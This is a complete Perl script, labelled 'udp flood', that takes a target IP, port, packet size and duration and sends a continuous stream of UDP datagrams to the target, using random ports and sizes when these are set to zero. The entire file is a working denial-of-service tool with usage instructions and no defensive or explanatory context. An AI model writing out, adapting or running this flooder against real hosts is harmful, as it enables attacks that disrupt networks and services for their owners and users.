#!/usr/bin/perl
##############
# udp flood.
##############
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "${0} <ip> <port> <size> <time>\n\n";
  print " Port=0: use random ports\n";
  print " Size=0: use random size between 64 and 1024\n";
  print " Time=0: continuous flood\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "Flooding [$ip] " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " datagrams" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","Padre Nuestro Que Estas En El Cielo"), 0, pack_sockaddr_in($pport, $iaddr));}